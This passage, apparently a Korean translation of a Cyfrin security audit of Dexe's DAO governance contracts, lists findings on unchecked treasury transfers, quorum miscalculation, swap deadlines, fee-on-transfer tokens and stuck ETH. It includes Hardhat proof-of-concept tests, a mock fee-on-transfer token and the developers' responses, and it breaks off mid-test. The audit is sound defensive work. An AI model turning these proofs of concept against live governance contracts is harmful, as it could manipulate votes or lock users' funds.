**Cyfrin:** 확인됨.


### `GovPool::delegateTreasury`가 피위임자에게 토큰과 NFT의 전송을 확인하지 않아 잠재적인 투표 조작을 초래함

**설명:** `GovPool::delegateTreasury`는 DAO 재무에서 `govUserKeeper`로 ERC20 토큰 및 특정 NFT를 전송합니다. 이 전송에 따라 피위임자의 `tokenBalance` 및 `nftBalance`가 증가합니다. 이를 통해 피위임자는 이 위임된 투표권을 사용하여 중요한 제안에 투표할 수 있습니다.

다음 `GovPool::delegateTreasury` 함수 스니펫에서 볼 수 있듯이, 토큰과 NFT가 실제로 `govUserKeeper`로 전송되는지에 대한 확인이 없습니다. 성공적인 전송이 완료되었고 그에 따라 피위임자의 투표권이 증가한다고 암시적으로 가정합니다.

```solidity
  function delegateTreasury(
        address delegatee,
        uint256 amount,
        uint256[] calldata nftIds
    ) external override onlyThis {
        require(amount > 0 || nftIds.length > 0, "Gov: empty delegation");
        require(getExpertStatus(delegatee), "Gov: delegatee is not an expert");

        _unlock(delegatee);

        if (amount != 0) {
            address token = _govUserKeeper.tokenAddress();

  >          IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals())); //@audit no check if tokens are actually transferred

            _govUserKeeper.delegateTokensTreasury(delegatee, amount);
        }

        if (nftIds.length != 0) {
            IERC721 nft = IERC721(_govUserKeeper.nftAddress());

            for (uint256 i; i < nftIds.length; i++) {
  >              nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]); //-n no check if nft's are actually transferred
            }

            _govUserKeeper.delegateNftsTreasury(delegatee, nftIds);
        }

        _revoteDelegated(delegatee, VoteType.TreasuryVote);

        emit DelegatedTreasury(delegatee, amount, nftIds, true);
    }
```

이는 악의적인 DAO 재무가 실제로 토큰을 한 번만 전송(하거나 전혀 전송하지 않음)하면서 투표권을 여러 배로 늘릴 수 있는 위험한 상황을 초래할 수 있습니다. 이는 `govUserKeeper` 계약의 총 회계 잔액이 해당 계약의 실제 토큰 잔액과 일치해야 한다는 불변성을 깨뜨립니다.


**영향:** ERC20 및 ERC721 토큰 구현 모두 DAO에 의해 제어되고 업그레이드 가능한 토큰 계약을 다루고 있으므로, 위의 암시적 전송 가정에 의해 잠재적인 러그 풀(rug-pull) 벡터가 생성됩니다.


**권장 완화 방법:** DEXE는 DAO 재무에 특별한 신뢰 권한을 부여하지 않는 무신뢰(trustless) 가정으로 시작하므로, 표준이 아닌 토큰(ERC20 및 ERC721 모두)에 대해서는 항상 "신뢰하되 검증하라(trust but verify)"는 접근 방식을 따르는 것이 현명합니다. 이를 위해, 토큰 전송 전/후에 토큰 및 NFT 잔액 증가 확인을 추가하는 것을 고려하십시오.


**Dexe:**
인지함; 이 발견은 우리가 통제할 수 없는 토큰에 관한 것입니다. `safeTransferFrom` 및 `transfer` 함수가 작동하지 않으려면 이러한 토큰이 손상되어야 합니다. 합법적인 토큰을 사용하면 모든 것이 의도한 대로 작동합니다.


### 정족수(quorum) 분모에 사용되는 정적 `GovUserKeeper::_nftInfo.totalPowerInTokens`가 정족수 도달을 불가능하게 만들 수 있음

**설명:** 다음 요소를 고려하십시오:

1) `GovPoolVote::_quorumReached()`는 정족수 도달 여부를 결정하기 위한 분모로 `GovUserKeeper::getTotalVoteWeight()`를 [사용](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolVote.sol#L337)합니다.

2) `GovUserKeeper::getTotalVoteWeight()`는 현재 ERC20 토큰 총 공급량에 `_nftInfo.totalPowerInTokens`를 [더한 값](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L573)을 반환합니다.

3) [초기화 시 한 번만 설정되는](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690-L694) `_nftInfo.totalPowerInTokens`는 ERC20 토큰으로 환산된 NFT 계약의 총 투표권을 나타냅니다.

NFT가 필요한 담보를 예치하지 않은 경우 NFT 전력이 0으로 감소할 수 있는 `ERC721Power` NFT를 사용하여 투표할 때, `ERC721Power.totalPower() == 0`이지만 `GovUserKeeper::_nftInfo.totalPowerInTokens > 0`인 상태가 발생할 수 있습니다.

따라서 NFT가 모든 투표권을 잃었음에도 불구하고 ERC20 투표 토큰의 투표권은 NFT의 초기 투표권인 `GovUserKeeper::_nftInfo.totalPowerInTokens`에 의해 잘못 희석됩니다.

이로 인해 정족수 도달이 불가능한 상태가 될 수 있습니다.

**영향:** 정족수 도달이 불가능할 수 있습니다.

**개념 증명 (Proof of Concept):** 먼저 GovUserKeeper [L677](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L677) 및 [L690](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690)을 주석 처리하여 투표 및 nft 계약을 즉시 변경할 수 있도록 합니다.

`GovPool.test.js`의 `describe("getProposalState()", () => {` 섹션 아래에 PoC 추가:
```javascript
      it("audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator can incorrectly make it impossible to reach quorum", async () => {
        // time when nft power calculation starts
        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

        // required so we can call .toFixed() on BN returned outputs
        ERC721Power.numberFormat = "BigNumber";

        // ERC721Power.totalPower should be zero as no nfts yet created
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // so proposal doesn't need to go to validators
        await changeInternalSettings(false);

        // set nftPower as the voting nft
        // need to comment out check preventing updating existing
        // nft address in GovUserKeeper::setERC721Address()
        await impersonate(govPool.address);
        await userKeeper.setERC721Address(nftPower.address, wei("190000000000000000000"), 1, { from: govPool.address });

        // create a new VOTER account and mint them the only power nft
        let VOTER = await accounts(10);
        await nftPower.safeMint(VOTER, 1);

        // switch to using a new ERC20 token for voting; lets us
        // control exactly who has what voting power without worrying about
        // what previous setups have done
        // requires commenting out require statement in GovUserKeeper::setERC20Address()
        let newVotingToken = await ERC20Mock.new("NEWV", "NEWV", 18);
        await impersonate(govPool.address);
        await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });

        // mint VOTER some tokens that when combined with their NFT are enough
        // to reach quorum
        let voterTokens = wei("190000000000000000000");
        await newVotingToken.mint(VOTER, voterTokens);
        await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });
        await nftPower.approve(userKeeper.address, "1", { from: VOTER });

        // VOTER deposits their tokens & nft to have voting power
        await govPool.deposit(VOTER, voterTokens, [1], { from: VOTER });

        // advance to the approximate time when nft power calculation starts
        await setTime(powerNftCalcStartTime);

        // verify nft power after power calculation has started
        let nftTotalPowerBefore = "900000000000000000000000000";
        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);

        // create a proposal which takes a snapshot of the current nft power
        let proposal1Id = 2;

        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
        );

        // vote on first proposal
        await govPool.vote(proposal1Id, true, voterTokens, [1], { from: VOTER });

        // advance time to allow proposal state change
        await setTime((await getCurrentBlockTime()) + 10);

        // verify that proposal has reached quorum;
        // VOTER's tokens & nft was enough to reach quorum
        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

        // advance time; since VOTER's nft doesn't have collateral deposited
        // its power will decrement to zero
        await setTime((await getCurrentBlockTime()) + 10000);

        // call ERC721::recalculateNftPower() for the nft, this will update
        // ERC721Power.totalPower with the actual current total power
        await nftPower.recalculateNftPower("1");

        // verify that the true totalPower has decremented to zero as the nft
        // lost all its power since it didn't have collateral deposited
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // create 2nd proposal which takes a snapshot of the current nft power
        let proposal2Id = 3;

        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
        );

        // vote on second proposal
        await govPool.vote(proposal2Id, true, voterTokens, [1], { from: VOTER });

        // advance time to allow proposal state change
        await setTime((await getCurrentBlockTime()) + 10);

        // verify that proposal has not reached quorum;
        // even though VOTER owns 100% of the supply of the ERC20 voting token,
        // it is now impossible to reach quorum since the power of VOTER's
        // ERC20 tokens is being incorrectly diluted through the quorum calculation
        // denominator assuming the nfts still have voting power.
        //
        // this is incorrect as the nft has lost all power. The root cause
        // is GovUserKeeper::_nftInfo.totalPowerInTokens which is static
        // but used in the denominator when calculating whether
        // quorum is reached
        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);
      });
```

실행: `npx hardhat test --grep "audit static GovUserKeeper::_nftInfo.totalPowerInTokens in quorum denominator"`

**권장 완화 방법:** `IERC721Power(nftAddress).totalPower() == 0`인 경우 `GovUserKeeper::getTotalVoteWeight` [L573](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L573)이 `_nftInfo.totalPowerInTokens` 대신 0을 사용하도록 변경하십시오.

제안된 `totalPower() == 0` 확인을 현재 `totalPower`에 대해 수행하는 것이 아니라, `GovUserKeeper::nftSnapshot[proposalSnapshotId]`에 저장된, 제안의 NFT 스냅샷이 생성되었을 때 저장된 `totalPower`에 대해 수행하도록 리팩토링해야 하는지 고려하십시오.

**Dexe:**
[PR172](https://github.com/dexe-network/DeXe-Protocol/commit/b2b30da3204acd16da6fa61e79703ac0b6271815), [PR173](https://github.com/dexe-network/DeXe-Protocol/commit/15edac2ba207a915bd537684cd7644831ec2c887) 및 커밋 [7a0876b](https://github.com/dexe-network/DeXe-Protocol/commit/7a0876b3c6f832d03b2d45760a85b42d23a21ce7)에서 수정되었습니다.

**Cyrin:**
완화 조치 과정에서 Dexe는 파워 NFT에 대해 상당한 리팩토링을 수행했습니다. 이전에는 1개의 계약이었던 것이 3개가 되었고, 파워 NFT 투표 계약과 `GovPool` 및 `GovUserKeeper` 간의 상호 작용이 크게 변경되었습니다.

새로운 구현에서:
* 사용자가 파워 NFT를 사용하여 [직접 투표할 때, 파워 NFT의 현재 전력을 사용합니다](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/libs/gov/gov-user-keeper/GovUserKeeperView.sol#L185).
* 사용자가 파워 NFT를 위임하고 [피위임자가 투표하게 할 때, 파워 NFT의 최소 전력을 캐시합니다](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/user-keeper/GovUserKeeper.sol#L266).
* 파워 NFT [`totalRawPower`가 계산될 때, 이는 항상 파워 NFT의 현재 전력을 사용합니다](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/ERC721/powers/AbstractERC721Power.sol#L212).
* [정족수 분모는 항상 `totalRawPower`를 사용](https://github.com/dexe-network/DeXe-Protocol/blob/440b8b3534d58d16df781b402503be5a64d5d576/contracts/gov/user-keeper/GovUserKeeper.sol#L619)하며, 이는 현재 전력에서 계산됩니다.

이로 인한 효과는 다음과 같습니다:
* 사용자는 파워 NFT를 직접 사용하여 투표하는 것에 비해 파워 NFT를 위임할 때 큰 불이익을 받습니다.
* 정족수 분모는 항상 현재 NFT 전력을 기반으로 하므로, 사용자가 NFT를 위임하고 최소 투표권만 받는 경우 지나치게 부풀려질 것입니다.

이 시나리오를 설명하는 `GovPool.test.js`의 PoC는 다음과 같습니다:
```javascript
       it("audit actual power nft voting power doesn't match total nft voting power", async () => {
          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

          // required so we can call .toFixed() on BN returned outputs
          ERC721RawPower.numberFormat = "BigNumber";

          // ERC721RawPower::totalPower should be zero as no nfts yet created
          assert.equal((await nftPower.totalPower()).toFixed(), "0");

          // set nftPower as the voting nft
          // need to comment out check preventing updating existing
          // nft address in GovUserKeeper::setERC721Address()
          await impersonate(govPool.address);
          await userKeeper.setERC721Address(nftPower.address, wei("33000"), 33, { from: govPool.address });

          // create new MASTER & SLAVE accounts
          let MASTER = await accounts(10);
          let SLAVE  = await accounts(11);

          // mint MASTER 1 power nft
          let masterNftId = 1;
          await nftPower.mint(MASTER, masterNftId, "");

          // advance to the approximate time when nft power calculation starts
          await setTime(powerNftCalcStartTime);

          // verify MASTER's nft has current power > 0
          let masterNftCurrentPowerStart = (await nftPower.getNftPower(masterNftId)).toFixed();
          assert.equal(masterNftCurrentPowerStart, "894960000000000000000000000");
          // verify MASTER's nft has minumum power = 0
          let masterNftMinPowerStart = (await nftPower.getNftMinPower(masterNftId)).toFixed();
          assert.equal(masterNftMinPowerStart, "0");

          // MASTER deposits their nft then delegates it to SLAVE, another address they control
          await nftPower.approve(userKeeper.address, masterNftId, { from: MASTER });
          await govPool.deposit("0", [masterNftId], { from: MASTER });
          await govPool.delegate(SLAVE, "0", [masterNftId], { from: MASTER });

          // delegation triggers power recalculation on master's nft. Delegation caches
          // the minimum possible voting power of master's nft 0 and uses that for
          // slaves delegated voting power. But recalculation uses the current power
          // of Master's NFT > 0 to update the contract's total power, and this value
          // is used in the denominator of the quorum calculation
          assert.equal((await nftPower.totalPower()).toFixed(), "894690000000000000000000000");

          // mint THIRD some voting tokens & deposit them
          let thirdTokens = wei("1000");
          await token.mint(THIRD, thirdTokens);
          await token.approve(userKeeper.address, thirdTokens, { from: THIRD });
          await govPool.deposit(thirdTokens, [], { from: THIRD });

          // create a proposal
          let proposalId = 1;
          await govPool.createProposal("",
            [[govPool.address, 0, getBytesDelegateTreasury(THIRD, wei("1"), [])]], [], { from: THIRD });

          // MASTER uses their SLAVE account to vote on the proposal; this reverts
          // as delegation saved the minimum possible voting power of MASTER's nft 0
          // and uses 0 as the voting power
          await truffleAssert.reverts(
            govPool.vote(proposalId, true, 0, [], { from: SLAVE }),
            "Gov: low voting power"
          );

          // MASTER has the one & only power nft
          // It has current power   = 894690000000000000000000000
          // nft.Power.totalPower() = 894690000000000000000000000
          // This value will be used in the denominator of the quorum calculation
          // But in practice its actual voting power is 0 since the minumum
          // possible voting power is used for voting power in delegation, causing
          // the quorum denominator to be over-inflated
        });
```

또한 이 영역의 상당한 리팩토링으로 인해 수정을 확인하는 데 사용된 업데이트된 PoC는 다음과 같습니다:

```javascript
        it("audit verified: nft totalPower > 0 when all nfts lost power incorrectly makes it impossible to reach quorum", async () => {
          // required so we can call .toFixed() on BN returned outputs
          ERC721RawPower.numberFormat = "BigNumber";

          // time when nft power calculation starts
          let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

          // create a new nft power token with max power same as voting token's
          // total supply; since we only mint 1 nft this keeps PoC simple
          let voterTokens = wei("190000000000000000000");

          let newNftPower = await ERC721RawPower.new();
          await newNftPower.__ERC721RawPower_init(
            "NFTPowerMock",
            "NFTPM",
            powerNftCalcStartTime,
            token.address,
            toPercent("0.01"),
            voterTokens,
            "540"
          );

          // ERC721Power.totalPower should be zero as no nfts yet created
          assert.equal((await newNftPower.totalPower()).toFixed(), "0");

          // so proposal doesn't need to go to validators
          await changeInternalSettings(false);

          // set newNftPower as the voting nft
          // need to comment out check preventing updating existing
          // nft address in GovUserKeeper::setERC721Address()
          await impersonate(govPool.address);
          // individualPower & supply params not used for power nfts
          await userKeeper.setERC721Address(newNftPower.address, "0", 0, { from: govPool.address });

          // create a new VOTER account and mint them the only power nft
          let VOTER = await accounts(10);
          let voterNftId = 1;
          await newNftPower.mint(VOTER, voterNftId, "");

          // switch to using a new ERC20 token for voting; lets us
          // control exactly who has what voting power without worrying about
          // what previous setups have done
          // requires commenting out require statement in GovUserKeeper::setERC20Address()
          let newVotingToken = await ERC20Mock.new("NEWV", "NEWV", 18);
          await impersonate(govPool.address);
          await userKeeper.setERC20Address(newVotingToken.address, { from: govPool.address });

          // mint VOTER some tokens that when combined with their NFT are enough
          // to reach quorum
          await newVotingToken.mint(VOTER, voterTokens);
          await newVotingToken.approve(userKeeper.address, voterTokens, { from: VOTER });
          await newNftPower.approve(userKeeper.address, voterNftId, { from: VOTER });

          // VOTER deposits their tokens & nft to have voting power
          await govPool.deposit(voterTokens, [voterNftId], { from: VOTER });

          // advance to the approximate time when nft power calculation starts
          await setTime(powerNftCalcStartTime);

          // verify nft power after power calculation has started
          assert.equal((await newNftPower.totalPower()).toFixed(), voterTokens);

          // create a proposal
          let proposal1Id = 2;

          await govPool.createProposal(
            "example.com",
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
          ,{from : VOTER});

          // vote on first proposal
          await govPool.vote(proposal1Id, true, voterTokens, [voterNftId], { from: VOTER });

          // advance time to allow proposal state change
          await setTime((await getCurrentBlockTime()) + 10);

          // verify that proposal has reached quorum;
          // VOTER's tokens & nft was enough to reach quorum'
          // since VOTER owns all the voting erc20s & power nfts
          //
          // fails here; proposal still in Voting state?
          assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);
          // advance time; since VOTER's nft doesn't have collateral deposited
          // its power will decrement to zero
          await setTime((await getCurrentBlockTime()) + 10000);

          // create 2nd proposal
          let proposal2Id = 3;

          await govPool.createProposal(
            "example.com",
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
            [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
          ,{from : VOTER});

          // vote on second proposal
          await govPool.vote(proposal2Id, true, voterTokens, [voterNftId], { from: VOTER });

          // advance time to allow proposal state change
          await setTime((await getCurrentBlockTime()) + 10);

          // this used to fail as the proposal would fail to reach quorum
          // but now it works
          assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);
        });
```

**Dexe:**
우리는 이 인플레이션 문제를 인지하고 있습니다. 불행히도 이것은 우리가 감수해야 할 희생일 것입니다. 파워 NFT의 비즈니스 로직을 고려할 때 우리는 두 가지 난처한 상황 사이에 놓여 있습니다. "현재 전력"을 사용하는 루프(이는 잠재적으로 전체 공급이 단일 사용자에게 위임될 수 있으므로 피위임자에게 작동하지 않음)를 사용하거나 최소 전력 및 정족수 인플레이션을 사용하는 것입니다.

두 번째 옵션이 더 좋고 훨씬 우아해 보입니다. 또한 사용자가 NFT에 담보를 추가하도록 장려합니다.

\clearpage
## 중간 위험 (Medium Risk)


### 스왑 마감 기한으로 `block.timestamp`를 사용하는 것은 보호 기능을 제공하지 않음

**설명:** `block.timestamp`는 `PriceFeed::exchangeFromExact()` [L106](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol#L106) 및 `PriceFeed::exchangeToExact()` [L151](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol#L151)에서 스왑 마감 기한으로 사용됩니다.

PoS 모델에서 제안자(proposer)는 자신이 하나 또는 연속적인 블록을 제안할 것인지 미리 잘 알고 있습니다. 이러한 시나리오에서 악의적인 검증자는 트랜잭션을 보류했다가 더 유리한 블록 번호에서 실행할 수 있습니다.

**영향:** `block.timestamp`는 트랜잭션이 삽입되는 블록의 값을 가지므로 보호 기능을 제공하지 않으며, 따라서 악의적인 검증자에 의해 트랜잭션이 무기한 보류될 수 있습니다.

**권장 완화 방법:** 함수 호출자가 스왑 마감 기한 입력 매개변수를 지정할 수 있도록 허용하는 것을 고려하십시오.

**Dexe:**
기능이 제거되었습니다.


### `_mint()` 대신 `ERC721::_safeMint()` 사용

**설명:** `AbstractERC721Multiplier::_mint()` [L89](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/AbstractERC721Multiplier.sol#L89) 및 `ERC721Expert::mint()` [L30](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Expert.sol#L30)에서 `ERC721::_mint()` 대신 `ERC721::_safeMint()`를 사용하십시오.

**영향:** `ERC721::_mint()`를 사용하면 ERC721 토큰을 지원하지 않는 주소로 ERC721 토큰을 발행할 수 있는 반면, `ERC721::_safeMint()`는 ERC721 토큰을 지원하는 주소로만 발행되도록 보장합니다. OpenZeppelin은 `_mint()` 사용을 [권장하지 않습니다](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/token/ERC721/ERC721.sol#L275).

프로젝트 팀이 이 경우 `_mint()`의 사용이 올바르다고 믿는다면, 그 이유를 해당 코드가 있는 곳에 문서화해야 합니다.

**권장 완화 방법:** ERC721에 대해 `_mint()` 대신 `_safeMint()`를 사용하십시오.

**Dexe:**
우리는 다음과 같은 이유로 `_safeMint()`를 사용하지 않을 것입니다:

1. 잠재적인 재진입(re-entrancy) 취약점을 엽니다.
2. 발행에 대한 결정은 DAO가 내립니다. 우리는 누구에게 토큰을 보낼지에 대해 그들을 제한하지 않을 것입니다.


### 전송 수수료(fee-on-transfer) 토큰을 사용하여 분배 제안에 자금을 지원하면 제안 자금 부족이 발생하여 보상 청구가 되돌려짐(revert)

**설명:** `DistributionProposal::execute()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67)은 전송 수수료 토큰을 고려하지 않고 `proposal.rewardAmount`를 입력 `amount` 매개변수로 설정합니다.

**영향:** 전송 수수료 토큰이 `amount-fee` 만큼의 토큰을 `DistributionProposal` 계약으로 전송했으므로 분배 제안의 자금이 부족하게 되어 사용자는 보상을 청구할 수 없으며 `DistributionProposal::claim()`은 되돌려집니다.

**개념 증명 (Proof of Concept):** 먼저 새 파일 `mock/tokens/ERC20MockFeeOnTransfer.sol`을 추가하십시오:
```solidity
// Copyright (C) 2017, 2018, 2019, 2020 dbrock, rain, mrchico, d-xo
// SPDX-License-Identifier: AGPL-3.0-only

// adapted from https://github.com/d-xo/weird-erc20/blob/main/src/TransferFee.sol

pragma solidity >=0.6.12;

contract Math {
    // --- Math ---
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x);
    }
    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x);
    }
}

contract WeirdERC20 is Math {
    // --- ERC20 Data ---
    string  public   name;
    string  public   symbol;
    uint8   public   decimals;
    uint256 public   totalSupply;
    bool    internal allowMint = true;

    mapping (address => uint)                      public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);

    // --- Init ---
    constructor(string memory _name,
                string memory _symbol,
                uint8 _decimalPlaces) public {
        name     = _name;
        symbol   = _symbol;
        decimals = _decimalPlaces;
    }

    // --- Token ---
    function transfer(address dst, uint wad) virtual public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }
    function transferFrom(address src, address dst, uint wad) virtual public returns (bool) {
        require(balanceOf[src] >= wad, "WeirdERC20: insufficient-balance");
        if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
            require(allowance[src][msg.sender] >= wad, "WeirdERC20: insufficient-allowance");
            allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);
        }
        balanceOf[src] = sub(balanceOf[src], wad);
        balanceOf[dst] = add(balanceOf[dst], wad);
        emit Transfer(src, dst, wad);
        return true;
    }
    function approve(address usr, uint wad) virtual public returns (bool) {
        allowance[msg.sender][usr] = wad;
        emit Approval(msg.sender, usr, wad);
        return true;
    }

    function mint(address to, uint256 _amount) public {
        require(allowMint, "WeirdERC20: minting is off");

        _mint(to, _amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "WeirdERC20: mint to the zero address");

        totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            balanceOf[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }

    function burn(address from, uint256 _amount) public {
        _burn(from, _amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "WeirdERC20: burn from the zero address");

        uint256 accountBalance = balanceOf[account];
        require(accountBalance >= amount, "WeirdERC20: burn amount exceeds balance");
        unchecked {
            balanceOf[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function toggleMint() public {
        allowMint = !allowMint;
    }
}

contract ERC20MockFeeOnTransfer is WeirdERC20 {

    uint private fee;

    // --- Init ---
    constructor(string memory _name,
                string memory _symbol,
                uint8 _decimalPlaces,
                uint _fee) WeirdERC20(_name, _symbol, _decimalPlaces) {
        fee = _fee;
    }

    // --- Token ---
    function transferFrom(address src, address dst, uint wad) override public returns (bool) {
        require(balanceOf[src] >= wad, "ERC20MockFeeOnTransfer: insufficient-balance");
        // don't worry about allowances for this mock
        //if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
        //    require(allowance[src][msg.sender] >= wad, "ERC20MockFeeOnTransfer insufficient-allowance");
        //    allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);
        //}

        balanceOf[src] = sub(balanceOf[src], wad);
        balanceOf[dst] = add(balanceOf[dst], sub(wad, fee));
        balanceOf[address(0)] = add(balanceOf[address(0)], fee);

        emit Transfer(src, dst, sub(wad, fee));
        emit Transfer(src, address(0), fee);

        return true;
    }
}
```

그런 다음 `test/gov/proposals/DistributionProposal.test.js`를 다음과 같이 변경하십시오:

* 새 줄 L24 `const ERC20MockFeeOnTransfer = artifacts.require("ERC20MockFeeOnTransfer");` 추가
* 새 줄 L51 `ERC20MockFeeOnTransfer.numberFormat = "BigNumber";` 추가
* `describe("claim()", () => {` 섹션 아래에 다음 PoC 추가:
```javascript
      it("using fee-on-transfer tokens to fund distribution proposals prevents claiming rewards", async () => {
        // create fee-on-transfer token with 1 wei transfer fee
        // this token also doesn't implement approvals so don't need to worry about that
        let feeOnTransferToken
          = await ERC20MockFeeOnTransfer.new("MockFeeOnTransfer", "MockFeeOnTransfer", 18, wei("1"));

        // mint reward tokens to sending address
        await feeOnTransferToken.mint(govPool.address, wei("10"));

        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [
            [feeOnTransferToken.address, 0, getBytesApprove(dp.address, wei("10"))],
            [dp.address, 0, getBytesDistributionProposal(1, feeOnTransferToken.address, wei("10"))],
          ],
          [],
          { from: SECOND }
        );

        // attempt to fully fund the proposal using the fee-on-transfer reward token
        await impersonate(govPool.address);
        await dp.execute(1, feeOnTransferToken.address, wei("10"), { from: govPool.address });

        // only 1 vote so SECOND should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });

        // attempting to claim the reward fails as the proposal is under-funded
        // due to the fee-on-transfer token transferring less into the DistributionProposal
        // contract than the inputted amount
        await truffleAssert.reverts(dp.claim(SECOND, [1]), "Gov: insufficient funds");
      });
```

실행: `npx hardhat test --grep "fee-on-transfer"`

**권장 완화 방법:** 다음 두 가지 옵션 중 하나를 고려하십시오:

1. 현재 버전에서는 전송 수수료 토큰을 지원하지 마십시오. 웹사이트와 공식 문서에 거버넌스 토큰이나 판매 토큰으로서 DAO 풀에서 이러한 토큰을 사용해서는 안 된다고 명확히 언급하십시오.

2. 전송 수수료 토큰을 지원하려면 `DistributionProposal::execute()`는 다음을 수행해야 합니다:
* 보상 토큰에 대한 계약의 현재 erc20 잔액 확인,
* erc20 토큰 전송,
* 보상 토큰에 대한 계약 잔액의 실제 변화를 계산하고 이를 보상 금액으로 설정.

전송 수수료 토큰을 지원하기 위해 유사한 수정이 필요할 수 있는 다른 곳:
* `TokenSaleProposalWhitelist::lockParticipationTokens()`
* `GovUserKeeper::depositTokens()`
* `GovPool::delegateTreasury()`

프로젝트가 전송 수수료 토큰을 사용하는 시스템의 모든 기능을 수행하는 포괄적인 단위 및 통합 테스트를 추가할 것을 권장합니다. 또한 리베이스(Rebasing) 토큰을 지원할지 여부를 고려하고 리베이스 토큰에 대한 유사한 단위 테스트를 구현할 것을 권장합니다. 프로젝트가 더 이상 전송 수수료 토큰을 지원하지 않으려면 이를 사용자에게 명확히 해야 합니다.

**Dexe:**
우리는 시스템 전체에서 전송 수수료 토큰을 지원하지 않을 것입니다. 흐름 중에 계약 간에 많은 내부 토큰 전송이 있습니다. 전송 수수료 토큰을 지원하면 안 좋은 UX와 최종 사용자에게 막대한 수수료가 발생할 것입니다.


### 분배 제안이 ETH와 ERC20 토큰으로 동시에 자금을 지원받으면 ETH가 갇히게 됨

**설명:** [`DistributionProposal::execute()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L49-L69)는 동일한 트랜잭션에서 분배 제안이 eth와 erc20 토큰 모두에 의해 동시에 자금을 지원받을 수 있도록 허용합니다.

**영향:** 이 경우 보상을 청구하면 erc20 토큰만 릴리스되고 eth는 `DistributionProposal` 계약에 영구적으로 갇히게 됩니다.

**개념 증명 (Proof of Concept):** `test/gov/proposals/DistributionProposal.test.js`의 `describe("claim()", () => {` 섹션 아래에 PoC 추가:
```javascript
      it("audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth", async () => {
        // DistributionProposal eth balance starts at 0
        let balanceBefore = toBN(await web3.eth.getBalance(dp.address));
        assert.equal(balanceBefore, 0);

        // mint reward tokens to sending address
